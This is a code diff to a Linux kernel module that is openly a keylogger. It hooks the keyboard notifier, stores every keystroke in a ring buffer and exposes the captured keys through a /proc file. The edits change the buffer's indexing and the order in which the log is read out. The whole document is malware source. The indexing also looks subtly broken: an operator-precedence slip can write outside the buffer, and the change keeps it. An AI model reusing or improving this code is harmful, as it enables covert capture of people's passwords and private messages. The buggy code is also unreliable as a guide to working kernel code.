@@ -18,6 +18,7 @@ static size_t keycount = 0;
 
 void addToLog(char key);
 
+//circular buffer simulator
 
 int tracker(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
@@ -242,7 +243,7 @@ static struct notifier_block nb = {
 
 
 void addToLog(char key) {
-    log[keycount++ % LOGGER_LENGTH-1] = key;
+    log[++keycount % LOGGER_LENGTH-1] = key;
 }
 
 //struct to hold info regarding /proc file
@@ -264,7 +265,7 @@ static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t cou
 	if(*pos != 0) { return 0; }	
 
     length += sprintf(buffer+length, "[");
-	for(i = LOGGER_LENGTH-1; i >= 0; i--) {
+	for(i = 0; i < LOGGER_LENGTH; i++) {
 
         length += sprintf(buffer+length,"%c ", log[i]);
         
